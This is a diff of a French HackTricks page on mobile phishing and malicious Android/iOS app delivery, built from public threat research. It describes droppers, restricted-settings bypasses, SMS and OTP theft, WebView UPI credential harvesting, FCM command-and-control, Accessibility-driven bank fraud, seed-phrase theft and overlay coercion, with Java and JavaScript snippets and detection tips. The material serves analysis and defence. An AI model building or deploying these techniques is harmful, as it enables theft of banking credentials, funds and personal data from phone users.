@@ -1,26 +1,26 @@
-# Hameçonnage mobile & Distribution d'applications malveillantes (Android & iOS)
+# Phishing mobile & distribution d'applications malveillantes (Android & iOS)
 
 {{#include ../../banners/hacktricks-training.md}}
 
 > [!INFO]
-> Cette page couvre les techniques utilisées par des acteurs malveillants pour distribuer des **Android APKs malveillants** et des **iOS mobile-configuration profiles** via phishing (SEO, ingénierie sociale, faux stores, applications de rencontre, etc.).
+> Cette page couvre les techniques utilisées par des acteurs menaçants pour distribuer des **Android APKs malveillants** et des **iOS mobile-configuration profiles** via le phishing (SEO, ingénierie sociale, fausses boutiques, apps de rencontres, etc.).
 > Le matériel est adapté de la campagne SarangTrap exposée par Zimperium zLabs (2025) et d'autres recherches publiques.
 
 ## Flux d'attaque
 
-1. **SEO/Infrastructure de phishing**
-* Enregistrer des dizaines de domaines ressemblants (dating, cloud share, car service…).
-– Utiliser des mots-clés en langue locale et des emojis dans l'élément `<title>` pour se placer dans Google.
-– Héberger *à la fois* les instructions d'installation Android (`.apk`) et iOS sur la même page de destination.
+1. **SEO/Phishing Infrastructure**
+* Enregistrer des dizaines de domaines ressemblants (sites de rencontres, partage cloud, service automobile…).
+– Utiliser des mots-clés en langue locale et des emojis dans l'élément `<title>` pour obtenir du classement dans Google.
+– Héberger *à la fois* les instructions d'installation Android (`.apk`) et iOS sur la même landing page.
 2. **Téléchargement de première étape**
-* Android : lien direct vers un APK *unsigned* ou provenant d'un “third-party store”.
-* iOS : `itms-services://` ou lien HTTPS simple vers un **mobileconfig** profile malveillant (voir ci‑dessous).
+* Android : lien direct vers un APK *non signé* ou issu d'un « third-party store ».
+* iOS : `itms-services://` ou lien HTTPS simple vers un **mobileconfig** malveillant (voir ci‑dessous).
 3. **Ingénierie sociale post-installation**
-* Au premier lancement, l'app demande un **invitation / verification code** (illusion d'accès exclusif).
+* Au premier lancement l'app demande un **code d'invitation / vérification** (illusion d'accès exclusif).
 * Le code est **POSTed over HTTP** vers le Command-and-Control (C2).
-* Le C2 répond `{"success":true}` ➜ le malware continue.
-* L'analyse dynamique Sandbox / AV qui ne soumet jamais de code valide ne voit **aucun comportement malveillant** (évasion).
-4. **Abus des permissions à l'exécution** (Android)
+* Le C2 répond `{"success":true}` ➜ le malware poursuit.
+* Les analyses dynamiques Sandbox / AV qui ne soumettent jamais de code valide n'observent **aucun comportement malveillant** (évasion).
+4. **Abus des permissions à l'exécution (Android)**
 * Les permissions dangereuses ne sont demandées **qu'après une réponse positive du C2** :
 ```xml
 <uses-permission android:name="android.permission.READ_CONTACTS"/>
@@ -28,36 +28,46 @@
 <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
 <!-- Older builds also asked for SMS permissions -->
 ```
-* Les variantes récentes **suppriment `<uses-permission>` pour SMS dans `AndroidManifest.xml`** mais laissent le chemin Java/Kotlin qui lit les SMS via reflection ⇒ baisse du score statique tout en restant fonctionnel sur les appareils qui accordent la permission via un abus d'`AppOps` ou des cibles anciennes.
-5. **Interface de façade & collecte en arrière-plan**
+* Les variantes récentes **suppriment `<uses-permission>` pour SMS dans `AndroidManifest.xml`** mais laissent le chemin Java/Kotlin qui lit les SMS via reflection ⇒ réduit le score statique tout en restant fonctionnel sur des appareils où la permission est accordée via `AppOps` abuse ou des cibles anciennes.
+
+5. **Android 13+ Restricted settings & Dropper Bypass (SecuriDropper‑style)**
+* Android 13 a introduit les **Restricted settings** pour les apps sideloadées : les bascules Accessibility et Notification Listener sont grisées tant que l'utilisateur n'autorise pas explicitement les restricted settings dans **App info**.
+* Les pages de phishing et les droppers fournissent maintenant des instructions UI étape‑par‑étape pour **autoriser les restricted settings** pour l'app sideloadée puis activer l'accès Accessibility/Notification.
+* Un contournement plus récent consiste à installer la charge utile via un **session‑based PackageInstaller flow** (la même méthode que les stores utilisent). Android traite l'app comme installée depuis un store, donc Restricted settings ne bloque plus Accessibility.
+* Indice de triage : dans un dropper, grep pour `PackageInstaller.createSession/openSession` plus du code qui navigue immédiatement la victime vers `ACTION_ACCESSIBILITY_SETTINGS` ou `ACTION_NOTIFICATION_LISTENER_SETTINGS`.
+
+6. **UI de façade & collecte en arrière-plan**
 * L'app affiche des vues inoffensives (visionneuse SMS, sélecteur de galerie) implémentées localement.
-* Pendant ce temps, elle exfiltre :
+* En parallèle elle exfiltre :
 - IMEI / IMSI, numéro de téléphone
 - Dump complet de `ContactsContract` (tableau JSON)
 - JPEG/PNG depuis `/sdcard/DCIM` compressés avec [Luban](https://github.com/Curzibn/Luban) pour réduire la taille
 - Contenu SMS optionnel (`content://sms`)
 Les payloads sont **batch-zippés** et envoyés via `HTTP POST /upload.php`.
-6. **Technique de livraison iOS**
-* Un seul **mobile-configuration profile** peut demander `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration`, etc. pour enrôler l'appareil dans une supervision de type “MDM”.
+7. **Technique de livraison iOS**
+* Un seul **mobile-configuration profile** peut demander `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` etc. pour enrôler l'appareil dans une supervision de type “MDM”.
 * Instructions d'ingénierie sociale :
-1. Ouvrir Settings ➜ *Profile downloaded*.
-2. Taper *Install* trois fois (captures d'écran sur la page de phishing).
-3. Faire confiance au profil non signé ➜ l'attaquant obtient les droits *Contacts* & *Photo* sans revue de l'App Store.
-7. **Couche réseau**
+1. Ouvrir Réglages ➜ *Profil téléchargé*.
+2. Appuyer sur *Installer* trois fois (captures d'écran sur la page de phishing).
+3. Faire confiance au profil non signé ➜ l'attaquant obtient les droits *Contacts* & *Photo* sans revue App Store.
+8. **Payload iOS Web Clip (icône d'app de phishing)**
+* Les payloads `com.apple.webClip.managed` peuvent **épingler une URL de phishing à l'écran d'accueil** avec une icône/libellé de marque.
+* Les Web Clips peuvent s'exécuter en **plein écran** (cache l'UI du navigateur) et être marqués **non‑retirables**, forçant la victime à supprimer le profil pour retirer l'icône.
+9. **Couche réseau**
 * HTTP en clair, souvent sur le port 80 avec un header HOST comme `api.<phishingdomain>.com`.
-* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (pas de TLS → facile à repérer).
+* `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (pas de TLS → facilement détectable).
 
-## Red-Team Tips
+## Conseils Red-Team
 
-* **Dynamic Analysis Bypass** – Pendant l'évaluation du malware, automatiser la phase du invitation code avec Frida/Objection pour atteindre la branche malveillante.
+* **Dynamic Analysis Bypass** – Pendant l'évaluation du malware, automatiser la phase du code d'invitation avec Frida/Objection pour atteindre la branche malveillante.
 * **Manifest vs. Runtime Diff** – Comparer `aapt dump permissions` avec le runtime `PackageManager#getRequestedPermissions()` ; l'absence de perms dangereuses est un signal d'alerte.
 * **Network Canary** – Configurer `iptables -p tcp --dport 80 -j NFQUEUE` pour détecter des rafales POST suspectes après la saisie du code.
 * **mobileconfig Inspection** – Utiliser `security cms -D -i profile.mobileconfig` sur macOS pour lister `PayloadContent` et repérer des entitlements excessifs.
 
-## Useful Frida Snippet: Auto-Bypass Invitation Code
+## Extrait Frida utile : contournement automatique du code d'invitation
 
 <details>
-<summary>Frida: auto-bypass invitation code</summary>
+<summary>Frida : contournement automatique du code d'invitation</summary>
 ```javascript
 // frida -U -f com.badapp.android -l bypass.js --no-pause
 // Hook HttpURLConnection write to always return success
@@ -88,17 +98,17 @@ LubanCompress 1.1.8       # "Luban" string inside classes.dex
 
 ## Android WebView Payment Phishing (UPI) – Dropper + FCM C2 Pattern
 
-Ce schéma a été observé dans des campagnes exploitant des thèmes liés aux prestations gouvernementales pour voler des identifiants UPI indiens et des OTP. Les opérateurs enchaînent des plateformes réputées pour la distribution et la résilience.
+This pattern has been observed in campaigns abusing government-benefit themes to steal Indian UPI credentials and OTPs. Operators chain reputable platforms for delivery and resilience.
 
 ### Delivery chain across trusted platforms
-- Leurre vidéo YouTube → la description contient un lien court
-- Lien court → site de phishing GitHub Pages imitant le portail légitime
-- Le même repo GitHub héberge un APK avec un faux badge “Google Play” pointant directement vers le fichier
-- Pages de phishing dynamiques hébergées sur Replit ; le canal de commande à distance utilise Firebase Cloud Messaging (FCM)
+- YouTube video lure → description contains a short link
+- Lien court → GitHub Pages phishing site imitating the legit portal
+- Same GitHub repo hosts an APK with a fake “Google Play” badge linking directly to the file
+- Des pages de phishing dynamiques hébergées sur Replit ; le canal de commande distant utilise Firebase Cloud Messaging (FCM)
 
 ### Dropper with embedded payload and offline install
-- Le premier APK est un installer (dropper) qui inclut le réel malware à `assets/app.apk` et invite l'utilisateur à désactiver le Wi‑Fi / les données mobiles pour réduire la détection cloud.
-- Le payload embarqué s'installe sous un libellé anodin (p.ex., “Secure Update”). Après l'installation, l'installer et le payload sont présents en tant qu'apps séparées.
+- First APK is an installer (dropper) that ships the real malware at `assets/app.apk` and prompts the user to disable Wi‑Fi/mobile data to blunt cloud detection.
+- The embedded payload installs under an innocuous label (e.g., “Secure Update”). After install, both the installer and the payload are present as separate apps.
 
 Static triage tip (grep for embedded payloads):
 ```bash
@@ -109,7 +119,7 @@ zipgrep -i "classes|.apk" sample.apk | head
 ### Découverte dynamique d'endpoints via shortlink
 - Malware récupère une liste en texte brut, séparée par des virgules, d'endpoints actifs depuis un shortlink ; de simples transformations de chaînes produisent le chemin final de la page de phishing.
 
-Exemple (sanitisé) :
+Exemple (assaini) :
 ```
 GET https://rebrand.ly/dclinkto2
 Response: https://sqcepo.replit.app/gate.html,https://sqcepo.replit.app/addsm.php
@@ -125,16 +135,16 @@ String upiPage = parts[0].replace("gate.html", "gate.htm");
 String smsPost = parts[1];
 String credsPost = upiPage.replace("gate.htm", "addup.php");
 ```
-### WebView-based UPI credential harvesting
-- L'étape “Make payment of ₹1 / UPI‑Lite” charge un formulaire HTML malveillant depuis l'endpoint dynamique à l'intérieur d'une WebView et capture des champs sensibles (téléphone, banque, UPI PIN) qui sont envoyés via `POST` à `addup.php`.
+### Collecte d'identifiants UPI via WebView
+- L'étape « Make payment of ₹1 / UPI‑Lite » charge un formulaire HTML malveillant depuis un endpoint dynamique à l'intérieur d'un WebView et capture des champs sensibles (téléphone, banque, UPI PIN) qui sont envoyés via `POST` à `addup.php`.
 
-Chargeur minimal :
+Loader minimal:
 ```java
 WebView wv = findViewById(R.id.web);
 wv.getSettings().setJavaScriptEnabled(true);
 wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
 ```
-### Self-propagation et SMS/OTP interception
+### Self-propagation and SMS/OTP interception
 - Des autorisations agressives sont demandées au premier lancement :
 ```xml
 <uses-permission android:name="android.permission.READ_CONTACTS"/>
@@ -143,9 +153,9 @@ wv.loadUrl(upiPage); // ex: https://<replit-app>/gate.htm
 <uses-permission android:name="android.permission.CALL_PHONE"/>
 ```
 - Les contacts sont parcourus pour envoyer en masse des SMS de smishing depuis l'appareil de la victime.
-- Les SMS entrants sont interceptés par un broadcast receiver et téléversés avec des métadonnées (sender, body, SIM slot, per-device random ID) vers `/addsm.php`.
+- Les SMS entrants sont interceptés par un broadcast receiver et uploadés avec des métadonnées (expéditeur, contenu, slot SIM, ID aléatoire par appareil) vers `/addsm.php`.
 
-Esquisse du broadcast receiver:
+Schéma du receiver :
 ```java
 public void onReceive(Context c, Intent i){
 SmsMessage[] msgs = Telephony.Sms.Intents.getMessagesFromIntent(i);
@@ -159,8 +169,8 @@ postForm(urlAddSms, new FormBody.Builder()
 }
 }
 ```
-### Firebase Cloud Messaging (FCM) en tant que C2 résilient
-- Le payload s'enregistre auprès de FCM ; les push messages contiennent un champ `_type` utilisé comme un commutateur pour déclencher des actions (par ex. mettre à jour des templates de texte de phishing, basculer des comportements).
+### Firebase Cloud Messaging (FCM) comme un C2 résilient
+- Le payload s'enregistre auprès de FCM ; les push messages transportent un champ `_type` utilisé comme commutateur pour déclencher des actions (par ex., mettre à jour des modèles de texte de phishing, activer/désactiver des comportements).
 
 Exemple de payload FCM:
 ```json
@@ -185,20 +195,20 @@ case "smish": sendSmishToContacts(); break;
 }
 ```
 ### Indicateurs/IOCs
-- L'APK contient un secondary payload dans `assets/app.apk`
-- Le WebView charge le payment depuis `gate.htm` et exfiltrates vers `/addup.php`
-- SMS exfiltration vers `/addsm.php`
-- Récupération de config via shortlink (p. ex., `rebrand.ly/*`) renvoyant des endpoints CSV
-- Applications étiquetées de façon générique “Update/Secure Update”
+- APK contient un payload secondaire dans `assets/app.apk`
+- WebView charge le paiement depuis `gate.htm` et exfiltre vers `/addup.php`
+- Exfiltration SMS vers `/addsm.php`
+- Récupération de config via shortlink (p.ex., `rebrand.ly/*`) renvoyant des endpoints CSV
+- Applications étiquetées comme génériques “Update/Secure Update”
 - Messages FCM `data` avec un discriminateur `_type` dans des apps non fiables
 
 ---
 
-## APK Smuggling basé sur Socket.IO/WebSocket + fausses pages Google Play
+## Socket.IO/WebSocket-based APK Smuggling + Fake Google Play Pages
 
 Les attaquants remplacent de plus en plus les liens APK statiques par un canal Socket.IO/WebSocket intégré dans des leurres imitant Google Play. Cela dissimule l'URL du payload, contourne les filtres URL/extension et préserve une UX d'installation réaliste.
 
-Flux client typique observé sur le terrain :
+Flux client typique observé sur le terrain:
 
 <details>
 <summary>Socket.IO fake Play downloader (JavaScript)</summary>
@@ -223,9 +233,9 @@ document.body.appendChild(a); a.click();
 ```
 </details>
 
-Pourquoi il échappe aux contrôles simples :
-- Aucune URL .apk statique n'est exposée ; le payload est reconstruit en mémoire à partir des frames WebSocket.
-- Les filtres URL/MIME/extensions qui bloquent les réponses directes .apk peuvent manquer les données binaires tunnelées via WebSockets/Socket.IO.
+Pourquoi il échappe à des contrôles simples :
+- Aucune URL APK statique n'est exposée ; le payload est reconstruit en mémoire à partir des trames WebSocket.
+- Les filtres URL/MIME/d'extension qui bloquent les réponses directes .apk peuvent ne pas détecter des données binaires tunnelisées via WebSockets/Socket.IO.
 - Les crawlers et sandboxes d'URL qui n'exécutent pas WebSockets ne récupéreront pas le payload.
 
 Voir aussi WebSocket tradecraft et tooling :
@@ -235,17 +245,17 @@ Voir aussi WebSocket tradecraft et tooling :
 {{#endref}}
 
 
-## Android Accessibility/Overlay & Device Admin Abuse, ATS automation, and NFC relay orchestration – Cas d'étude RatOn
+## Android Accessibility/Overlay & Device Admin Abuse, automatisation ATS et orchestration de relais NFC – étude de cas RatOn
 
-La campagne RatOn banker/RAT (ThreatFabric) est un exemple concret de la façon dont les opérations modernes de mobile phishing combinent WebView droppers, Accessibility-driven UI automation, overlays/ransom, Device Admin coercion, Automated Transfer System (ATS), crypto wallet takeover, et même NFC-relay orchestration. Cette section synthétise les techniques réutilisables.
+La campagne RatOn banker/RAT (ThreatFabric) est un exemple concret montrant comment les opérations modernes de phishing mobile mêlent des WebView droppers, Accessibility-driven UI automation, overlays/ransom, coercition Device Admin, Automated Transfer System (ATS), crypto wallet takeover, et même NFC-relay orchestration. Cette section abstrait les techniques réutilisables.
 
 ### Stage-1 : WebView → native install bridge (dropper)
-Les attaquants affichent un WebView pointant vers une page malveillante et injectent une interface JavaScript qui expose un installateur natif. Un tap sur un bouton HTML appelle du code natif qui installe un APK de second étage inclus dans les assets du dropper, puis le lance directement.
+Les attaquants présentent un WebView pointant vers une page malveillante et injectent une interface JavaScript qui expose un native installer. Un appui sur un bouton HTML appelle du code natif qui installe un APK de second stade inclus dans les assets du dropper, puis le lance directement.
 
-Modèle minimal :
+Pattern minimal:
 
 <details>
-<summary>Stage-1 dropper minimal pattern (Java)</summary>
+<summary>Pattern minimal du dropper Stage-1 (Java)</summary>
 ```java
 public class DropperActivity extends Activity {
 @Override protected void onCreate(Bundle b){
@@ -274,23 +284,25 @@ wv.loadUrl("https://attacker.site/install.html");
 }
 }
 ```
-Je n'ai reçu aucun contenu à traduire. Merci de coller ici le texte (le contenu du fichier src/generic-methodologies-and-resources/phishing-methodology/mobile-phishing-malicious-apps.md ou l'HTML de la page) et je le traduirai en respectant les consignes (ne pas traduire le code, les noms de techniques, les liens, les chemins ni les balises).
+</details>
+
+HTML sur la page:
 ```html
 <button onclick="bridge.installApk()">Install</button>
 ```
-Après l'installation, le dropper démarre le payload via package/activity explicite :
+Après l'installation, le dropper lance le payload via un package/activity explicite :
 ```java
 Intent i = new Intent();
 i.setClassName("com.stage2.core", "com.stage2.core.MainActivity");
 startActivity(i);
 ```
-Hunting idea: untrusted apps calling `addJavascriptInterface()` and exposing installer-like methods to WebView; APK shipping an embedded secondary payload under `assets/` and invoking the Package Installer Session API.
+Idée de chasse : applications non fiables appelant `addJavascriptInterface()` et exposant des méthodes de type installateur au WebView ; APK embarquant un payload secondaire sous `assets/` et invoquant le Package Installer Session API.
 
 ### Entonnoir de consentement : Accessibility + Device Admin + follow-on runtime prompts
-Stage-2 opens a WebView that hosts an “Access” page. Its button invokes an exported method that navigates the victim to the Accessibility settings and requests enabling the rogue service. Once granted, malware uses Accessibility to auto-click through subsequent runtime permission dialogs (contacts, overlay, manage system settings, etc.) and requests Device Admin.
+Stage-2 ouvre un WebView qui héberge une page “Access”. Son bouton invoque une méthode exportée qui dirige la victime vers les paramètres Accessibility et demande l'activation du service malveillant. Une fois accordé, le malware utilise Accessibility pour cliquer automatiquement à travers les dialogues de permission runtime subséquents (contacts, overlay, gestion des paramètres système, etc.) et demande Device Admin.
 
-- Accessibility programmatically helps accept later prompts by finding buttons like “Allow”/“OK” in the node-tree and dispatching clicks.
-- Overlay permission check/request:
+- Accessibility aide, de manière programmatique, à accepter les invites ultérieures en trouvant des boutons comme “Allow”/“OK” dans l'arbre de nœuds et en simulant des clics.
+- Vérification/demande de permission Overlay :
 ```java
 if (!Settings.canDrawOverlays(ctx)) {
 Intent i = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION,
@@ -306,17 +318,17 @@ Voir aussi :
 
 ### Overlay phishing/ransom via WebView
 Les opérateurs peuvent émettre des commandes pour :
-- afficher un overlay en plein écran depuis une URL, ou
-- transmettre du HTML inline qui est chargé dans un overlay WebView.
+- afficher une overlay plein écran depuis une URL, ou
+- transmettre du HTML inline qui est chargé dans une overlay WebView.
 
-Usages probables : coercition (saisie du PIN), ouverture de wallet pour capturer les PINs, messages de rançon. Conserver une commande pour vérifier/garantir que la permission d'overlay est accordée si elle manque.
+Utilisations probables : coercition (saisie du PIN), ouverture de wallet pour capturer les PINs, ransom messaging. Prévoir une commande pour vérifier/obtenir l'autorisation d'overlay si elle manque.
 
-### Modèle de contrôle à distance – pseudo-écran texte + screen-cast
-- Bande passante réduite : exporter périodiquement l'arbre de nœuds Accessibility, sérialiser les textes/roles/bounds visibles et envoyer au C2 comme pseudo-écran (commandes comme `txt_screen` pour une capture ponctuelle et `screen_live` en continu).
+### Remote control model – text pseudo-screen + screen-cast
+- Basse bande passante : dumper périodiquement l'Accessibility node tree, sérialiser les textes/roles/bounds visibles et envoyer au C2 comme un pseudo-écran (commandes comme `txt_screen` une fois et `screen_live` en continu).
 - Haute fidélité : demander MediaProjection et démarrer le screen-casting/enregistrement à la demande (commandes comme `display` / `record`).
 
 ### ATS playbook (bank app automation)
-À partir d'une tâche JSON, ouvrir l'application bancaire, piloter l'UI via Accessibility avec un mélange de requêtes par texte et de taps sur des coordonnées, et saisir le PIN de paiement de la victime lorsqu'il est demandé.
+Étant donné une tâche JSON, ouvrir l'application bancaire, piloter l'UI via Accessibility avec un mélange de requêtes textuelles et de taps par coordonnées, et saisir le PIN de paiement de la victime lorsqu'il est demandé.
 
 Exemple de tâche :
 ```json
@@ -328,7 +340,7 @@ Exemple de tâche :
 "name": "ACME"
 }
 ```
-Exemples de textes observés dans un flux cible (CZ → EN):
+Exemples de textes vus dans un flux cible (CZ → EN) :
 - "Nová platba" → "Nouveau paiement"
 - "Zadat platbu" → "Saisir le paiement"
 - "Nový příjemce" → "Nouveau bénéficiaire"
@@ -339,37 +351,37 @@ Exemples de textes observés dans un flux cible (CZ → EN):
 - "Zaplatit" → "Payer"
 - "Hotovo" → "Terminé"
 
-Les opérateurs peuvent également vérifier/augmenter les limites de transfert via des commandes comme `check_limit` et `limit` qui naviguent de la même manière dans l'UI des limites.
+Les opérateurs peuvent également vérifier/augmenter les limites de virement via des commandes comme `check_limit` et `limit` qui naviguent de la même manière dans l'interface des limites.
 
 ### Crypto wallet seed extraction
-Cibles comme MetaMask, Trust Wallet, Blockchain.com, Phantom. Flux : déverrouiller (PIN volé ou mot de passe fourni), naviguer vers Security/Recovery, révéler/afficher la seed phrase, keylog/exfiltrate it. Implémentez des sélecteurs tenant compte de la locale (EN/RU/CZ/SK) pour stabiliser la navigation entre les langues.
+Cibles comme MetaMask, Trust Wallet, Blockchain.com, Phantom. Flux : déverrouiller (PIN volé ou mot de passe fourni), naviguer vers Security/Recovery, révéler/afficher la seed phrase, keylog/exfiltrate it. Implémenter des sélecteurs sensibles à la locale (EN/RU/CZ/SK) pour stabiliser la navigation entre les langues.
 
 ### Device Admin coercion
-Les Device Admin APIs sont utilisées pour augmenter les opportunités de PIN-capture et frustrer la victime :
+Les Device Admin APIs sont utilisées pour augmenter les opportunités de capture du PIN et contrarier la victime :
 
 - Verrouillage immédiat :
 ```java
 dpm.lockNow();
 ```
-- Expirer le credential actuel pour forcer le changement (Accessibility capture le nouveau PIN/password):
+- Expirer l'identifiant actuel pour forcer le changement (Accessibilité capture le nouveau PIN/mot de passe) :
 ```java
 dpm.setPasswordExpirationTimeout(admin, 1L); // requires admin / often owner
 ```
-- Forcer le déverrouillage non biométrique en désactivant les fonctionnalités biométriques du keyguard :
+- Forcer le déverrouillage non biométrique en désactivant les fonctionnalités biométriques de keyguard :
 ```java
 dpm.setKeyguardDisabledFeatures(admin,
 DevicePolicyManager.KEYGUARD_DISABLE_FINGERPRINT |
 DevicePolicyManager.KEYGUARD_DISABLE_TRUST_AGENTS);
 ```
-Remarque : Beaucoup de contrôles DevicePolicyManager requièrent Device Owner/Profile Owner sur les versions récentes d'Android ; certaines builds OEM peuvent être laxistes. Validez toujours sur l'OS/OEM cible.
+Note : De nombreux contrôles DevicePolicyManager nécessitent Device Owner/Profile Owner sur les versions récentes d'Android ; certaines builds OEM peuvent être laxistes. Validez toujours sur l'OS/OEM cible.
 
 ### NFC relay orchestration (NFSkate)
-Stage-3 peut installer et lancer un module NFC-relay externe (par ex., NFSkate) et même lui fournir un template HTML pour guider la victime pendant le relay. Cela permet des cash-out sans contact en mode card-present parallèlement à de l'ATS en ligne.
+Stage-3 peut installer et lancer un module de relais NFC externe (par ex., NFSkate) et lui fournir un template HTML pour guider la victime pendant le relais. Cela permet un cash-out sans contact avec carte présente en parallèle d'ATS en ligne.
 
 Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new-cash-out-tactic-with-nfc-relay).
 
-### Ensemble de commandes opérateur (exemple)
-- UI/état: `txt_screen`, `screen_live`, `display`, `record`
+### Operator command set (sample)
+- UI/state: `txt_screen`, `screen_live`, `display`, `record`
 - Social: `send_push`, `Facebook`, `WhatsApp`
 - Overlays: `overlay` (inline HTML), `block` (URL), `block_off`, `access_tint`
 - Wallets: `metamask`, `trust`, `blockchain`, `phantom`
@@ -380,16 +392,16 @@ Background: [NFSkate NFC relay](https://www.threatfabric.com/blogs/ghost-tap-new
 
 ### Accessibility-driven ATS anti-detection: human-like text cadence and dual text injection (Herodotus)
 
-Les acteurs de menace combinent de plus en plus l'automatisation basée sur Accessibility avec des anti-détections ajustées contre les biométriques comportementales basiques. Un banker/RAT récent présente deux modes complémentaires de livraison de texte et un toggle opérateur pour simuler la frappe humaine avec une cadence aléatoire.
+Les acteurs de menace mélangent de plus en plus l'automatisation pilotée par Accessibility avec des techniques anti-détection adaptées aux biométries comportementales de base. Un banker/RAT récent présente deux modes complémentaires de livraison de texte et un bascule opérateur pour simuler la saisie humaine avec une cadence randomisée.
 
-- Mode discovery : énumérer les nœuds visibles avec selectors et bounds pour cibler précisément les inputs (ID, text, contentDescription, hint, bounds) avant d'agir.
-- Injection de texte duale :
+- Discovery mode : énumérer les nœuds visibles avec des sélecteurs et des bounds pour cibler précisément les entrées (ID, text, contentDescription, hint, bounds) avant d'agir.
+- Dual text injection :
 - Mode 1 – `ACTION_SET_TEXT` directement sur le nœud cible (stable, sans clavier) ;
-- Mode 2 – set du clipboard + `ACTION_PASTE` dans le nœud focalisé (fonctionne lorsque le setText direct est bloqué).
-- Cadence humaine : diviser la chaîne fournie par l'opérateur et la livrer caractère par caractère avec des délais aléatoires de 300–3000 ms entre les événements pour échapper aux heuristiques de “machine-speed typing”. Implémenté soit en faisant croître progressivement la valeur via `ACTION_SET_TEXT`, soit en collant un caractère à la fois.
+- Mode 2 – clipboard set + `ACTION_PASTE` dans le nœud focalisé (fonctionne lorsque setText direct est bloqué).
+- Human-like cadence : découper la chaîne fournie par l'opérateur et la transmettre caractère par caractère avec des délais aléatoires de 300–3000 ms entre les événements pour échapper aux heuristiques de "machine-speed typing". Implémenté soit en faisant croître progressivement la valeur via `ACTION_SET_TEXT`, soit en collant un caractère à la fois.
 
 <details>
-<summary>Esquisse Java : découverte de nœuds + saisie retardée par caractère via setText ou clipboard+paste</summary>
+<summary>Exemple Java : découverte de nœuds + saisie différée caractère par caractère via setText ou clipboard+paste</summary>
 ```java
 // Enumerate nodes (HVNCA11Y-like): text, id, desc, hint, bounds
 void discover(AccessibilityNodeInfo r, List<String> out){
@@ -424,8 +436,8 @@ Thread.sleep(300 + new java.util.Random().nextInt(2701));
 ```
 </details>
 
-Overlays de blocage pour masquer la fraude :
-- Afficher un `TYPE_ACCESSIBILITY_OVERLAY` plein écran avec une opacité contrôlée par l'opérateur ; le garder opaque pour la victime pendant que l'automatisation distante continue en dessous.
+Overlays bloquants pour masquer la fraude :
+- Rendre un `TYPE_ACCESSIBILITY_OVERLAY` plein écran avec une opacité contrôlée par l'opérateur ; le maintenir opaque pour la victime pendant que l'automatisation distante se déroule en dessous.
 - Commandes généralement exposées : `opacityOverlay <0..255>`, `sendOverlayLoading <html/url>`, `removeOverlay`.
 
 Overlay minimal avec alpha ajustable :
@@ -439,7 +451,7 @@ WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
 PixelFormat.TRANSLUCENT);
 wm.addView(v, lp);
 ```
-Primitives de contrôle opérateur couramment observées : `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (partage d'écran).
+Primitives de contrôle opérateur fréquemment observées : `BACK`, `HOME`, `RECENTS`, `CLICKTXT`/`CLICKDESC`/`CLICKELEMENT`/`CLICKHINT`, `TAP`/`SWIPE`, `NOTIFICATIONS`, `OPNPKG`, `VNC`/`VNCA11Y` (partage d'écran).
 
 ## Références
 
@@ -454,5 +466,7 @@ Primitives de contrôle opérateur couramment observées : `BACK`, `HOME`, `RECE
 - [Banker Trojan Targeting Indonesian and Vietnamese Android Users (DomainTools)](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
 - [DomainTools SecuritySnacks – ID/VN Banker Trojans (IOCs)](https://github.com/DomainTools/SecuritySnacks/blob/main/2025/BankerTrojan-ID-VN)
 - [Socket.IO](https://socket.io)
+- [Bypassing Android 13 Restrictions with SecuriDropper (ThreatFabric)](https://www.threatfabric.com/blogs/droppers-bypassing-android-13-restrictions)
+- [Web Clips payload settings for Apple devices](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
 
 {{#include ../../banners/hacktricks-training.md}}
